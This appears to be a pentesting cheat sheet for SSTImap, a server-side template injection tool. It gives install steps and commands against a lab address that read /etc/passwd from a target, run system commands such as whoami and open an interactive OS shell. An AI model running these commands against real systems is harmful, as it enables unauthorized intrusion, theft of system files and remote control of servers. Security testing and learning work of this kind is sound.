# [SSTImap](https://github.com/vladko312/SSTImap)
***
### Installation
```shell
$ git clone https://github.com/vladko312/SSTImap
$ cd SSTImap
$ pip3 install -r requirements.txt
$ python3 sstimap.py
```

### Automatic Identification of any SSTI vulnerability and template engine used:
```
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=1337
```
### Download a remote file to our machine
```
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=1337 -D '/etc/passwd' './password'
```

### Run a system command
```
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=1337 -S whoami
```

### Interactive shell
```
$ python3 sstimap.py -u http://172.17.0.2/index.php?name=1337 --os-shell
```

### Useful flags
* -u : Specify URL
* -D : Download remote file to out local machine
* -S : Execute system command
* --os-shell : Obtain interactive shell
